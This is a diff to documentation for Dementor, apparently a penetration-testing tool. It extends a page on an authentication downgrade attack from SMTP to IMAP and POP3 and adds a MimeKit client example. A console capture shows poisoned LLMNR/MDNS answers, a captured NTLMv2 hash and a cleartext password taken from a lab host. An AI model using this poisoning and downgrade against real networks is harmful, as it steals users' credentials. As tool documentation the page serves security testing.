@@ -1,10 +1,10 @@
 .. _example_smtp_downgrade:
 
-SMTP Downgrade Attack
-=====================
+SMTP/IMAP/POP3 Downgrade
+========================
 
-The SMTP server in *Dementor* supports a mechanism to attempt a *"downgrade"* of an authentication attempt
-initiated by a target host. This behavior is controlled by the :attr:`SMTP.Server.Downgrade` setting.
+The SMTP/POP3/IMAP server in *Dementor* supports a mechanism to attempt a *"downgrade"* of an authentication attempt
+initiated by a target host. This behavior is controlled by the :attr:`SMTP/IMAP/POP3.Server.Downgrade` setting.
 
 .. warning::
 
@@ -12,6 +12,11 @@ initiated by a target host. This behavior is controlled by the :attr:`SMTP.Serve
     component of the .NET Core platform. Although `DE0005 <https://github.com/dotnet/platform-compat/blob/master/docs/DE0005.md>`_ marks this component
     as deprecated and advises against its use, this example demonstrates how *Dementor* can be configured to simulate various attack scenarios.
 
+
+.. tip::
+
+    This attack also works against `MimeKit <https://mimekit.net>`_ due to their design choice when performing
+    authentication. **And most importantly, this attack also works for POP3 and IMAP**.
 
 Prerequisites
 -------------
@@ -89,4 +94,53 @@ or simulate a failure after NTLM auth to force the client to downgrade.
       :alt: Wireshark trace showing SMTP fallback to cleartext auth
 
       The client reattempts authentication with cleartext credentials after an NTLM failure.
+
+
+Going Further: Retrieving Credentials from MimeKit
+--------------------------------------------------
+
+The documentation for `MimeKit <https://mimekit.net>`_ explains that when authenticating via
+the `MailService.Authenticate <https://mimekit.net/docs/html/M_MailKit_MailService_Authenticate_1.htm>`_
+method, supported SASL mechanisms will influence how credentials are handled. However, this attack
+**will not** work if the client specifies a SASL mechanism directly.
+
+.. pull-quote::
+    If the server supports one or more SASL authentication mechanisms, then the SASL mechanisms that both the client and server
+    support (not including any OAUTH mechanisms) are tried in order of greatest security to weakest security. Once a SASL
+    authentication mechanism is found that both client and server support, the credentials are used to authenticate.
+
+    -- `MimeKit Documentation <https://mimekit.net/docs/html/M_MailKit_MailService_Authenticate_1.htm>`_
+
+Setting up a small program usually costs hours of installing stuff. Once complete, the following script
+demonstrates how this behavior is triggered from the client side:
+
+.. code-block:: csharp
+    :caption: MailProgram.cs
+
+    using (var smtpClient = new SmtpClient())
+    {
+        smtpClient.Connect(smtpHost, smtpPort, SecureSocketOptions.StartTls);
+        smtpClient.Authenticate("temple.master", "UseTheF0rce");
+        smtpClient.Send(message); // message create ommitted here
+        smtpClient.Disconnect(true);
+    }
+
+By default, no additional configuration is necessary. In the following capture, :attr:`NTLM.ExtendedSessionSecurity`
+has been disabled:
+
+.. container:: demo
+
+    .. code-block:: console
+        :emphasize-lines: 6,9,10
+
+        MDNS       fe80::b9cb:192d:31db:a0c5 5353   [+] Sent poisoned answer to fe80::b9cb:192d:31db:a0c5
+        LLMNR      192.168.56.122            5355   [*] Query for MAILSRV01 (type: AAAA)
+        LLMNR      192.168.56.122            5355   [+] Sent poisoned answer to 192.168.56.122
+        SMTP       fe80::b9cb:192d:31db:a0c5 25     [+] Captured NTLMv2 Hash for temple.master/ossus.contoso.local from fe80::b9cb:192d:31db:a0c5:
+        SMTP       fe80::b9cb:192d:31db:a0c5 25     NTLMv2 Username: temple.master
+        SMTP       fe80::b9cb:192d:31db:a0c5 25     NTLMv2 Hash: temple.master::ossus.contoso.local:313333374c454554:e8545823cb69a89c26da9d0b52dc01b7:[...]
+        SMTP       fe80::b9cb:192d:31db:a0c5 25     [*] Performing downgrade attack for target fe80::b9cb:192d:31db:a0c5
+        SMTP       fe80::b9cb:192d:31db:a0c5 25     [+] Captured Cleartext Password for temple.master@ossus.contoso.local from fe80::b9cb:192d:31db:a0c5:
+        SMTP       fe80::b9cb:192d:31db:a0c5 25     Cleartext Username: temple.master@ossus.contoso.local
+        SMTP       fe80::b9cb:192d:31db:a0c5 25     Cleartext Password: UseTheF0rce
 
